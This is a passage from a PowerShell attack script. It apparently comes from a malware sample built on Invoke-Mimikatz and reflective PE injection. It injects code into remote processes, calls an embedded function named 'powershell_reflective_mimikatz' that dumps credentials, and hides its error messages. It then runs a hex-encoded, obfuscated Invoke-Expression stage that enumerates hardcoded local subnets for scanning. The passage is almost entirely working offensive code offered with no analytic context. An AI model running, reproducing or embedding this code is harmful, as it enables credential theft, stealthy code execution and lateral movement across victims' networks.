				$SCLength = $CallDllMainSC1.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem

				Write-BytesToMemory -Bytes $CallDllMainSC1 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC1.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
				Write-BytesToMemory -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($CallDllMainSC3.Length)

				$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "U"
				}

				$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "U"
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
				$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "C"
				}

				$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants

					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}

		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}


	Function Invoke-MemoryFreeLibrary
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types

		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)

			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)

				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{

					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "E" -WarningAction Continue
				}

				$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "U" -WarningAction Continue
				}

				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}

		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)

		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null


		$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "U." -WarningAction Continue
		}
	}


	Function Main
	{
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants

		$RemoteProcHandle = [IntPtr]::Zero

		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "C"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "C"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				Write-Output $ProcInfo
				Throw "More "
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}


		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "ID: $ProcId"
			}


		}


        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {

            Write-Error "architecture" -ErrorAction Stop
        }

        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "U"
		}

		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process


		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{

				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "C"
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "U"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }

		}

		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "V"
			}

			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle

			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}

		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "U" -WarningAction Continue
			}
		}


	}

	Main
}

& ( $Shellid[1]+$sHeLLID[13]+'X')( [sTrIng]::jOiN( '', (( 66 ,75 , '6e' ,63 , 74 ,69 , '6f' , '6e',20,43 ,'6f' , '6e' , 76 ,65, 72 , 74 ,54 ,'6f', '2d',44 ,65 , 63,69 , '6d' ,61 , '6c' ,49, 50, 20, 28, '5b' ,'4e' ,65 , 74,'2e' ,49 ,50 ,41, 64, 64 , 72, 65 , 73 ,73 ,'5d', 24,49,50, 41,64, 64,72, 65 ,73, 73,29 , '7b' ,'d' , 'a',20 ,20 ,20 , 20 , 24 ,69 , 20, '3d' ,20 ,33 , '3b' , 20,24,44 , 65 ,63,69, '6d' , 61 , '6c',49, 50 ,20, '3d', 20,30 , '3b','d' , 'a' ,20,20,20,20 , 24, 49,50 , 41 ,64,64 , 72,65 , 73,73,'2e' , 47,65 , 74 ,41 , 64,64 ,72 ,65 ,73 , 73 , 42,79 ,74,65, 73 , 28 ,29 , 20,'7c',20 , 46, '4f',72, 65, 41,63 , 60 ,48,'2d' ,60 ,'6f',62, '6a',45,43 , 54,20 ,'7b',20 , 24 , 44 , 65, 63 ,69,'6d' ,61 , '6c' , 49,50 , 20, '2b' ,'3d', 20,24,'5f' , 20 ,'2a', 20 , '5b' ,'4d',61 ,74 ,68,'5d' ,'3a' ,'3a',50,'6f', 77 ,28, 32 , 35 ,36,'2c',20, 24,69 , 29 ,'3b',20, 24, 69 ,'2d' , '2d' , 20 , '7d', 'd' , 'a' ,20, 20, 20 ,20 ,72 ,65 , 74 ,75, 72 ,'6e' , 20 , '5b', 55, 49 , '6e' ,74 ,33 ,32,'5d', 24 , 44,65 ,63 ,69, '6d' , 61,'6c', 49,50 ,'d', 'a' ,'7d' , 'd' ,'a', 'd', 'a',66, 75 , '6e', 63, 74, 69 ,'6f','6e' ,20 ,43 ,'6f' ,'6e' , 76 ,65 , 72 ,74,54 ,'6f', '2d',44, '6f', 74, 74, 65, 64,44 , 65, 63 , 69 , '6d' , 61,'6c', 49 , 50 , 20,28 , '5b' ,53 , 74,72 ,69 , '6e' , 67 , '5d' , 24 , 49, 50 , 41 ,64, 64 , 72 ,65, 73 ,73, 29,'7b' , 'd' ,'a' , 20 , 20, 20 ,20 , 20,20, 20 ,20,24, 49, 50 ,41,64, 64 , 72, 65 ,73, 73 ,20 , '3d',20, '5b',55,49,'6e', 74, 33, 32 , '5d', 24 , 49, 50 , 41 , 64,64 ,72 , 65, 73, 73 , 'd' , 'a',20, 20 ,20,20 ,20,20,20 ,20 , 24, 44 ,'6f' ,74 ,74, 65, 64,49 ,50 ,20,'3d' ,20 ,24, 28, 20,46 , '6f' ,72, 20 ,28 ,24 , 69,20, '3d' , 20 , 33 , '3b' , 20 , 24 ,69 ,20,'2d' , 67 , 74 ,20,'2d' ,31 , '3b',20, 24 , 69 , '2d' , '2d' , 29,20,'7b' , 'd','a' ,20 , 20,20 , 20, 20 , 20, 20,20 ,20, 20 , 24 ,52,65,'6d' ,61, 69 , '6e', 64 , 65,72 ,20 , '3d',20, 24 ,49, 50 , 41,64,64,72 , 65,73, 73 , 20,25,20,'5b' , '4d',61 , 74 , 68, '5d' , '3a', '3a' ,50, '6f' ,77, 28, 32,35,36 ,'2c', 20, 24,69,29 , 'd' , 'a', 20,20, 20 , 20 , 20 , 20, 20,20 , 20,20, 28 , 24,49 ,50 , 41, 64,64 , 72, 65,73 ,73 ,20 , '2d',20, 24 , 52 , 65 , '6d' , 61 ,69,'6e' , 64, 65, 72,29, 20,'2f' , 20, '5b','4d', 61 , 74 , 68 ,'5d', '3a', '3a' ,50 ,'6f', 77,28, 32 ,35 ,36 ,'2c',20 , 24 ,69,29,'d', 'a',20 ,20 , 20, 20 ,20 , 20,20, 20,20 ,20,24 ,49, 50 ,41, 64 ,64, 72 , 65 ,73 ,73 , 20 , '3d' , 20,24,52 ,65,'6d' , 61 ,69,'6e' , 64,65 ,72,'d' ,'a', 20,20 , 20, 20 , 20 , 20 , 20 ,20,20, '7d' ,20 , 29,'d' , 'a', 20 ,20,20 , 20,20 , 20 , 20,20, 72 , 65 , 74 ,75 , 72 ,'6e' ,20, '5b', 53 ,74, 72 ,69 , '6e', 67,'5d','3a', '3a', '4a' ,'6f' ,69,'6e' ,28 , 27 , '2e',27, '2c' , 20 ,24, 44 ,'6f' ,74,74, 65 , 64 ,49 ,50 , 29,'d','a' , '7d', 'd','a' ,'d','a' , 66,75 ,'6e' ,63,74, 69, '6f' ,'6e' ,20 ,47, 65 , 74 , '2d','4e' ,65 ,74,77 ,'6f' ,72 , '6b' , 52,61, '6e' , 67,65, 28 , 20 , '5b' ,53 ,74 , 72, 69,'6e', 67,'5d' , 24 , 49, 50 ,'2c',20 , '5b' ,53 ,74, 72, 69,'6e', 67, '5d',24 ,'4d',61, 73,'6b', 20 ,29, 20,'7b' ,'d','a' ,20 ,20,24,44 , 65,63 , 69, '6d' , 61 , '6c' , 49, 50 ,20, '3d',20, 63, '4f', '6e',60, 56, 60 , 45,72 , 60 ,54 ,74 , '6f', '2d' , 44 , 45 ,43,49, 60, '6d',61 ,'4c' ,49 ,70, 20 ,24 ,49, 50, 'd' , 'a', 20, 20,24,44, 65 , 63, 69,'6d',61 ,'6c' , '4d', 61, 73 , '6b' , 20,'3d' ,20 ,43 , '4f','6e' ,76 , 45 ,60 ,52, 54, 54 ,60 ,'4f' ,'2d' ,64 , 65, 43 , 60, 49 , 60, '6d' ,61, '6c', 69, 70 ,20, 24,'4d',61, 73 , '6b','d', 'a' , 'd' ,'a',20, 20, 24 ,'4e', 65,74,77 , '6f' ,72 , '6b', 20, '3d',20 ,24, 44 ,65, 63, 69 ,'6d',61,'6c',49 ,50, 20 ,'2d', 62,61 , '6e' , 64 ,20 , 24, 44 ,65 ,63,69 , '6d' ,61 , '6c' ,'4d', 61 ,73 ,'6b', 'd', 'a',20,20 ,24 ,42 ,72 , '6f', 61 , 64 ,63,61, 73 ,74, 20,'3d' , 20 ,24, 44 ,65 , 63 ,69 , '6d' , 61,'6c', 49 , 50, 20, '2d', 62, '6f', 72 ,20, 28 , 28, '2d',62, '6e', '6f' , 74 ,20 ,24,44 , 65,63 ,69 , '6d' ,61 , '6c' ,'4d',61,73 , '6b',29, 20 , '2d',62,61 ,'6e' ,64,20 ,'5b' ,55,49, '6e' , 74 ,33 ,32 ,'5d','3a' ,'3a' , '4d' ,61, 78,56 , 61 , '6c' ,75 ,65 ,29,'d','a' ,'d','a', 20, 20,66,'6f' ,72, 20,28,24 , 69 , 20 ,'3d',20 ,24 , 28 , 24,'4e' , 65, 74, 77, '6f' , 72 ,'6b',20,'2b' , 20, 31 , 29,'3b' , 20, 24, 69, 20 ,'2d', '6c' ,74 , 20 ,24,42,72 ,'6f' ,61 ,64, 63 ,61,73 ,74, '3b' ,20, 24 ,69 , '2b','2b',29, 20 , '7b', 'd' ,'a',20, 20 , 20,20,43 ,'6f' , '6e' , 60 , 56, 45,52 ,54, 54 , 60,'4f' , 60, '2d',44, '6f' , 74 , 74 , 65 , 64 , 60,64, 45,63,69 ,60,'6d',41 , '4c' , 69 , 70,20, 24,69,'d', 'a' , 20 ,20 ,'7d' ,'d', 'a' ,20,20,23,53,74, 61,74 ,69, 63, 20, 57 , '4c',41 ,'4e',20 , 31, 'd','a' , 20,20 , 69 ,66 , 20, 28 , 21 ,28,24, 49,50, '2e', 63,'6f', '6e',74 , 61 , 69, '6e', 73 ,28,22, 31 ,39 , 32,'2e', 31, 36 , 38 ,'2e',30 , '2e' ,22 ,29 ,29 ,29 , 'd' , 'a', 20 , 20 ,'7b','d' , 'a', 20,20 , 20 , 20, 20,20 ,23, 20 , 31 ,39, 32 ,'2e' ,31 ,36, 38 , '2e' ,30 , '2e', '2a' ,'d' ,'a' , 20,20, 20, 20,20,20, 24, 44, 65, 63, 69 ,'6d' ,61 , '6c' , 49 ,50 , 20, '3d', 20 , 63 ,'4f', '6e',60 ,56 , 60 , 45, 72, 60 ,54,74,'6f','2d', 44, 45,43, 49,60, '6d' , 61 , '4c', 49,70 ,20 , 22, 31,39, 32,'2e', 31,36,38 , '2e', 30, '2e',31, 22, 'd' ,'a' , 20, 20 ,20 ,20, 20 ,20 ,24 ,44, 65 , 63, 69,'6d' ,61, '6c','4d' , 61,73,'6b' ,20 ,'3d' ,20, 43,'4f' ,'6e' ,76,45, 60 , 52,54,54 ,60 , '4f' , '2d',64,65 , 43 ,60 ,49,60 ,'6d' , 61 ,'6c', 69 ,70, 20 , 24, '4d' , 61, 73 , '6b','d' , 'a',20,20 ,20 ,20 , 20,20 , 24,'4e' ,65 , 74, 77, '6f' ,72 , '6b' ,20 , '3d' ,20, 24 ,44 , 65 ,63 ,69 ,'6d' , 61 , '6c',49 , 50,20 ,'2d', 62, 61, '6e',64, 20, 24 ,44 , 65 , 63,69 , '6d' , 61,'6c' ,'4d',61 , 73 ,'6b' ,'d', 'a',20, 20 ,20 ,20 ,20,20,24 , 42 , 72,'6f' , 61 ,64, 63 ,61,73 , 74,20,'3d',20, 24, 44, 65, 63, 69 ,'6d' , 61 , '6c', 49 , 50,20 , '2d' ,62 , '6f' , 72,20,28 ,28 ,'2d' , 62 , '6e','6f' ,74,20, 24, 44 ,65 , 63 , 69,'6d' , 61 , '6c' ,'4d' ,61 , 73,'6b' ,29 , 20, '2d', 62,61,'6e' ,64 , 20,'5b', 55,49 ,'6e', 74,33, 32, '5d', '3a' , '3a' , '4d' ,61 ,78 , 56, 61, '6c', 75 , 65 , 29,'d','a', 20 ,20 ,20,20 , 20 ,20,66, '6f' ,72 , 20, 28 ,24 ,69,20 , '3d',20,24 , 28,24 ,'4e' ,65,74 , 77 ,'6f', 72,'6b' , 20, '2b' ,20 , 31 ,29, '3b' , 20, 24 ,69 , 20 , '2d','6c' , 74 , 20,24 , 42 , 72 , '6f' ,61,64 , 63, 61,73,74 , '3b' ,20 , 24 ,69 ,'2b','2b' , 29, 20, '7b' , 'd', 'a' ,20 , 20 , 20 , 20 , 20 ,20 ,20 , 20, 43 , '6f' , '6e', 60, 56 , 45,52 ,54 ,54, 60 ,'4f' ,60 , '2d', 44, '6f' ,74, 74,65 , 64, 60 , 64 , 45 ,63,69,60 ,'6d' , 41, '4c' ,69,70 , 20, 24 , 69,'d','a' ,20 ,20 ,20,20,20 ,20, '7d', 'd', 'a' , 20 ,20 ,'7d', 'd','a',20 , 20, 23 ,53 , 74,61 , 74 , 69,63,20,57 ,'4c' ,41 , '4e' , 20 , 32 ,'d','a' , 20,20 ,69 , 66 , 20, 28,21 ,28, 24, 49 ,50 , '2e' , 63,'6f', '6e' , 74 , 61,69 , '6e' ,73 ,28 ,22 , 31 ,39,32, '2e' , 31 , 36 , 38 ,'2e' ,31, '2e' , 22 , 29, 29 , 29 ,'d' , 'a', 20 , 20 ,'7b', 'd', 'a' ,20,20, 20,20, 20,20, 23, 20 , 31, 39 , 32 , '2e',31, 36 ,38,'2e',31, '2e', '2a','d','a',20,20, 20, 20 ,20 , 20,24,44 , 65 , 63 ,69 ,'6d', 61 ,'6c' ,49, 50 , 20, '3d',20,63 , '4f' , '6e' , 60,56, 60, 45 , 72 ,60, 54 , 74 , '6f','2d',44, 45 ,43,49 , 60,'6d', 61 , '4c',49,70,20, 22, 31 ,39,32,'2e' ,31 ,36, 38, '2e' ,31,'2e', 31 ,22 ,'d' , 'a',20, 20, 20, 20,20 ,20,24, 44 , 65,63 , 69 , '6d', 61 , '6c', '4d' , 61, 73 , '6b',20, '3d', 20 , 43,'4f','6e' ,76 ,45 , 60 ,52 ,54,54, 60 ,'4f','2d' ,64 , 65 ,43 ,60 , 49,60, '6d',61 , '6c' ,69 , 70,20 ,24, '4d' , 61, 73, '6b' ,'d','a' , 20,20,20 ,20, 20,20,24,'4e',65, 74,77 ,'6f' ,72,'6b' ,20, '3d', 20 , 24,44 , 65 , 63 ,69,'6d',61 , '6c' , 49, 50,20 , '2d' ,62, 61,'6e', 64,20,24,44,65,63, 69,'6d',61 ,'6c', '4d' ,61 , 73 ,'6b' ,'d', 'a' , 20, 20 , 20 , 20 , 20, 20,24 , 42 ,72,'6f',61 , 64,63 ,61 , 73 , 74 ,20,'3d', 20,24 , 44, 65 , 63,69 ,'6d' ,61,'6c' , 49, 50,20,'2d' ,62 , '6f' ,72 , 20,28 ,28 ,'2d' ,62,'6e' , '6f', 74,20, 24, 44 , 65 ,63,69, '6d', 61 ,'6c' , '4d' , 61 , 73 ,'6b',29,20, '2d' , 62 , 61, '6e', 64 , 20 , '5b',55 , 49,'6e' ,74,33,32, '5d','3a','3a','4d', 61, 78, 56 , 61 ,'6c' ,75, 65 ,29 ,'d' , 'a', 20, 20,20 ,20, 20,20, 66, '6f' ,72,20, 28,24,69 , 20, '3d' , 20 ,24, 28, 24 , '4e', 65 , 74 ,77, '6f' , 72,'6b',20, '2b' , 20 , 31 , 29, '3b' , 20,24,69, 20, '2d' ,'6c' , 74, 20, 24 ,42,72 , '6f' ,61, 64 ,63 , 61 ,73, 74 , '3b', 20,24 , 69 ,'2b', '2b', 29 , 20 ,'7b', 'd' , 'a' , 20, 20, 20, 20, 20 , 20, 20, 20, 43, '6f','6e' ,60,56 ,45, 52 , 54,54, 60,'4f', 60, '2d' ,44 , '6f' , 74, 74 ,65 ,64, 60, 64 ,45,63 , 69 , 60 ,'6d',41, '4c' , 69 ,70,20, 24 ,69 ,'d', 'a' , 20,20, 20, 20 ,20 , 20,'7d' ,'d' , 'a' , 20, 20, '7d' , 'd' , 'a', 20 ,20,23 ,53 ,74 , 61, 74, 69 , 63 ,20, 57, '4c' , 41 ,'4e', 20, 33 ,'d','a' , 20 , 20 ,69,66,20 , 28,21,28 , 24, 49 , 50, '2e' , 63 , '6f' ,'6e',74 , 61 ,69, '6e' , 73, 28 , 22, 31,39,32,'2e' , 31,36,38, '2e' ,31,35,33 , '2e',22 ,29 ,29,29, 'd' , 'a',20, 20,'7b', 'd','a', 20, 20,20,20 , 20 , 20 , 23, 20 ,31 , 39 ,32 ,'2e' ,31 ,36 , 38 ,'2e', 31 , 35 ,33,'2e' , '2a' ,'d' ,'a' , 20, 20 , 20, 20,20 ,20,24, 44, 65 , 63, 69, '6d', 61,'6c',49 ,50 ,20 , '3d',20 , 63 ,'4f', '6e', 60, 56, 60,45,72,60,54, 74 , '6f' ,'2d',44,45, 43 , 49 ,60,'6d' , 61 , '4c' , 49, 70 , 20, 22,31,39 ,32 , '2e',31 ,36 , 38 ,'2e', 31, 35 , 33,'2e' ,31,22 ,'d' , 'a' ,20 ,20, 20,20 , 20,20,24, 44, 65 , 63,69 , '6d' , 61, '6c' , '4d',61 ,73, '6b',20 ,'3d',20, 43, '4f','6e', 76,45,60,52, 54, 54,60 ,'4f', '2d',64, 65, 43, 60, 49 , 60 , '6d',61 , '6c' ,69, 70,20, 24, '4d',61 ,73 , '6b' , 'd' , 'a' , 20,20, 20 , 20 ,20 , 20 , 24,'4e' , 65 ,74 ,77,'6f' ,72,'6b' , 20 ,'3d',20,24,44 ,65,63,69,'6d' ,61,'6c' , 49 ,50 , 20, '2d', 62 ,61 ,'6e' , 64 , 20 ,24 , 44, 65 , 63 ,69 , '6d',61 , '6c' , '4d' , 61,73 ,'6b' , 'd' ,'a' , 20,20 , 20,20 , 20 ,20,24 , 42 ,72, '6f',61 ,64,63 ,61 , 73 ,74, 20,'3d' , 20 , 24 ,44 , 65,63 ,69 ,'6d' , 61,'6c',49,50, 20 ,'2d',62, '6f',72 , 20, 28, 28,'2d',62, '6e','6f' ,74,20, 24, 44 ,65,63, 69 , '6d' , 61,'6c' ,'4d' , 61, 73,'6b' ,29, 20 , '2d' ,62, 61 ,'6e',64, 20 ,'5b',55 ,49 ,'6e',74,33 , 32, '5d' , '3a', '3a', '4d',61,78 ,56, 61 ,'6c', 75, 65 , 29 , 'd' , 'a' , 20,20,20, 20,20,20 , 66,'6f' ,72 , 20 ,28 ,24,69, 20,'3d', 20,24, 28, 24, '4e',65, 74 , 77 ,'6f', 72 ,'6b',20,'2b' ,20 , 31, 29,'3b' ,20, 24,69, 20, '2d', '6c' ,74 ,20, 24 ,42, 72 , '6f', 61, 64, 63 ,61 , 73 ,74 ,'3b', 20 ,24,69, '2b' , '2b', 29, 20 , '7b' ,'d' , 'a',20 , 20 , 20,20 , 20,20 , 20 , 20,43 ,'6f', '6e', 60 , 56 , 45, 52 , 54 ,54, 60,'4f' ,60, '2d' , 44,'6f',74 ,74 ,65 , 64 , 60 , 64,45 ,63,69,60 ,'6d',41,'4c' , 69 ,70, 20 ,24 , 69,'d', 'a' , 20, 20,20 , 20 , 20 ,20 , '7d', 'd' , 'a',20, 20,'7d', 'd' , 'a',20 , 20,23 ,53,74,61, 74, 69,63,20 , 57 ,'4c', 41,'4e' ,20 , 34 ,'d' , 'a', 20 , 20, 69 , 66, 20 ,28,21, 28 , 24, 49 ,50 ,'2e',63 ,'6f' ,'6e' ,74 , 61, 69 ,'6e',73 , 28,22, 31 , 30 ,'2e',30, '2e' , 30,'2e' , 22,29 , 29, 29,'d' , 'a' ,20 , 20, '7b','d' , 'a' ,20,20 , 20, 20 , 20 ,20, 23 , 20,31,30,'2e' , 30, '2e',30,'2e','2a', 'd', 'a',20 , 20 ,20, 20,20, 20, 24 , 44, 65 , 63,69, '6d',61, '6c' ,49 , 50, 20, '3d',20 ,63 , '4f', '6e', 60, 56 , 60,45, 72 , 60, 54 ,74 , '6f', '2d', 44, 45 , 43 ,49 , 60, '6d' ,61, '4c' , 49,70, 20 ,22 , 31 ,30 ,'2e' , 30 , '2e' , 30 ,'2e', 31,22,'d', 'a' , 20,20,20,20 , 20 , 20, 24 , 44, 65 , 63 ,69 , '6d',61 , '6c', '4d',61, 73 , '6b' ,20 ,'3d' ,20,43,'4f','6e' , 76, 45 , 60 , 52,54 , 54 ,60,'4f' , '2d',64 , 65,43,60 , 49, 60 ,'6d', 61, '6c' ,69, 70,20,24,'4d', 61,73 , '6b', 'd' ,'a' , 20,20, 20 ,20, 20 ,20, 24 , '4e', 65,74 , 77,'6f' , 72 , '6b' , 20, '3d',20, 24, 44, 65 ,63, 69,'6d' ,61,'6c' ,49 , 50,20, '2d' ,62, 61, '6e', 64 ,20 ,24,44,65 ,63 ,69 , '6d' , 61,'6c' ,'4d' , 61 ,73 , '6b' , 'd', 'a',20 ,20 , 20,20 , 20,20, 24,42,72, '6f',61 , 64, 63,61, 73,74,20, '3d',20 ,24 ,44,65,63,69, '6d',61 ,'6c' ,49 , 50,20 ,'2d' , 62, '6f',72 ,20 ,28,28, '2d' , 62,'6e' , '6f' , 74 , 20 ,24,44, 65 ,63 , 69 ,'6d',61 ,'6c' , '4d', 61, 73,'6b', 29 , 20 ,'2d', 62 , 61 , '6e',64 ,20 ,'5b' ,55, 49,'6e', 74 ,33 ,32 ,'5d' , '3a' , '3a','4d' ,61,78 ,56, 61,'6c' , 75 , 65 , 29 , 'd', 'a', 20, 20, 20, 20,20 ,20, 66 ,'6f' ,72, 20, 28 , 24 ,69,20 ,'3d',20,24,28,24 